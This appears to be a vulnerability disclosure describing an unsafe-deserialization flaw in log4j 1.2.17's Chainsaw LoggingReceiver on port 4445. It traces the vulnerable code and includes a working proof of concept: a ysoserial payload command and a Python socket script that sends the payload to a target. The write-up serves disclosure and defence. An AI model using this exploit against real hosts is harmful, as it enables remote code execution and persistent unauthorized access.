https://logging.apache.org/log4j/1.2/

Attackers can send malicious data to port 4445 monitored by log4j to deserialize.


Unlike CVE-2019-17571, the vulnerability I found is located in class LoggingReceiver `org.apache.log4j.chainsaw.LoggingReceiver` .
(According to the disclosed CVE-2019-17571 vulnerability details, the location of his vulnerability occurred at org.apache.log4j.net.SocketNode). 

Vulnerability analysis:
Set the listening port in the setupReceiver method on line 133 of src/main/java/org/apache/log4j/chainsaw/Main.java

```
private void setupReceiver(MyTableModel aModel) {
        int port = 4445;
        String strRep = System.getProperty("chainsaw.port");
        if (strRep != null) {
            try {
                port = Integer.parseInt(strRep);
            } catch (NumberFormatException var6) {
                LOG.fatal("Unable to parse chainsaw.port property with value "+ strRep + ".");
                JOptionPane.showMessageDialog(this, "Unable to parse port number from'" + strRep + "', quitting.", "CHAINSAW", 0);
                System.exit(1);
            }
        }

```
Then go to the LoggingReceiver class to process related connection information:
```
try {
            LoggingReceiver lr = new LoggingReceiver(aModel, port);
            lr.start();

```
Follow up LoggingReceiver class,start to get the data in the run method, encapsulate the mClient data into the ObjectInputStream object, and force the type to be converted to the LoggingEvent object when deserializing the ois:
src/main/java/org/apache/log4j/chainsaw/LoggingReceiver.java
```

public void run() {
            LoggingReceiver.LOG.debug("Starting to get data");

            try {
                ObjectInputStream ois = new ObjectInputStream(this.mClient.getInputStream());

                while(true) {
                    LoggingEvent event = (LoggingEvent)ois.readObject();
                    LoggingReceiver.this.mModel.addEvent(new EventDetails(event));
                }

```
There is an implementation of defaultReadObject in LoggingEvent class:
src/main/java/org/apache/log4j/spi/LoggingEvent.java
```
  private void readObject(ObjectInputStream ois)
                        throws java.io.IOException, ClassNotFoundException {
    ois.defaultReadObject();
    readLevel(ois);
 ```
Deserializing the ois object in the readLevel method triggers the vulnerability:
```
void readLevel(ObjectInputStream ois)
                      throws java.io.IOException, ClassNotFoundException {

    int p = ois.readInt();
    try {
      String className = (String) ois.readObject();
```

Vulnerability verification:
Start the visualization component
java -cp log4j-1.2.17.jar org.apache.log4j.chainsaw.Main

Sending the payload generated by ysoserial (https://github.com/angelwhu/ysoserial) to port 4445 of the target can trigger the vulnerability.

eg, generate malicious data exp.ser first:

`java -jar ysoserial.jar Jdk7u21 "calc" > exp.ser`

Write a python socket client after generating the data:

exp.py:
```
#coding:utf-8
import socket
s = socket.socket()
host = "172.20.10.14"#target ip
port = 4445#The listening port set by the component
s.connect((host,port))
ssss = open("exp.ser",'rb')//Malicious data
xc = ssss.read()
s.send(xc)
s.close()
```
running exp.py can trigger the vulnerability.


Although it is no longer maintained, many people are still citing log4j1.2.17,the component cited in new product chainsaw 2.1.0 also has this problem.
Attackers can use this vulnerability as a backdoor to maintain permissions.
